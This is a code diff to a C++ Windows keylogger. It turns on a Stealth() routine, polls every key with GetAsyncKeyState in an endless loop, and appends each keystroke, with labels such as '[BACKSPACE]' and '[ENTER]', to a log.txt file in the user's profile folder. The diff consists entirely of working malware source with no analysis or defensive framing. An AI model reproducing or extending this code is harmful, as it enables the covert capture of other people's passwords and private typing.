@@ -22,11 +22,12 @@ void Stealth();
 /// <returns></returns>
 int main() 
 {
-	//Stealth();
+	Stealth();
 	char i;
-	const char* userProfile = std::getenv("USERPROFILE");
+	std::string pathFile = std::getenv("USERPROFILE");
+	pathFile += "\\log.txt";
 
-	//userProfile += "\\log.txt";
+	const char* file = pathFile.c_str();
 
 	while (1)
 	{
@@ -34,7 +35,7 @@ int main()
 		{
 			if (GetAsyncKeyState(i) == -32767)
 			{
-				SaveLogs(i, userProfile);
+				SaveLogs(i, file);
 			}
 		}
 	}
@@ -64,7 +65,7 @@ int SaveLogs(int key_stroke, const char* file)
 			fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
 			break;
 		case 13:
-			fprintf(OUTPUT_FILE, "%s", "n");
+			fprintf(OUTPUT_FILE, "%s", "[ENTER]");
 			break;
 		case 32:
 			fprintf(OUTPUT_FILE, "%s", " ");
